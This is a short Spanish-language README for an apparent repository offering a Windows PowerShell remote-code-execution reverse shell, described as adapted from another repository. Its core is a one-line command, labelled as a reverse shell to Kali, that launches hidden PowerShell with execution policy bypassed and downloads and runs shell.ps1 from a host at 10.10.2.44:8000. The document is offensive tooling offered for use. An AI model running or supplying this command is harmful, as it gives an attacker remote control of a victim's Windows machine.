# RCE-para-Windows-PS1
Una version modificada de una que encontre en otro repositorio


La version funcional es shell.ps1, las otra versiones las deje para volver e intentar hacerlas funcionar, de igual forma puedes modificarlas.


Ignorar esta parte
:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.2.44:8000/shell.ps1')"
